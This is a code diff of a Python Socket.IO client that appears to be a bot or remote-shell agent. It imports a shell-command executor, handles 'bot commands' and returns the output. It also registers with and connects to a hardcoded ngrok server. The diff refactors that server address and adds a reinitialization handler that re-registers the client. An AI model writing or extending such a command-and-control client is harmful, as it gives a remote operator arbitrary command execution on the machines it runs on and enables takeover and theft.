@@ -3,6 +3,8 @@ from cmd_executer import execute_shell_command
 from random import randrange
 import requests
 
+server_url = 'https://f080-89-178-159-143.ngrok.io'
+
 sio = socketio.Client()
 
 @sio.event
@@ -17,18 +19,26 @@ def handle_bot_command(data):
             response = ">> Wrong response"
     sio.emit('command_response', str(initialization_code) + ' ' + response)
 
+@sio.event
+def handle_reinitialization(data):
+    print('Initialization reset!')
+    initialize_client()
+    sio.emit('command_response', str(initialization_code) + ' ')
+
+def initialize_client():
+    requests.post('{}/add-pending-client'.format(server_url), data={'init_code': str(initialization_code)})
+    print('Added to pending clients...')
+    requests.post('{}/wait-for-initialization'.format(server_url), data={'init_code': str(initialization_code)})
+    print('Initialized')
+
 def main():
-    url = 'https://c614-89-178-159-143.ngrok.io'
-    sio.connect(url)
+    sio.connect(server_url)
     
     global initialization_code
     initialization_code = randrange(10)
     print("Init code: ", initialization_code)
 
-    requests.post('{}/add-pending-client'.format(url), data={'init_code': str(initialization_code)})
-    print('Added to pending clients...')
-    requests.post('{}/wait-for-initialization'.format(url), data={'init_code': str(initialization_code)})
-    print('Initialized')
+    initialize_client()
 
     sio.emit('command_response', str(initialization_code) + ' ')
     
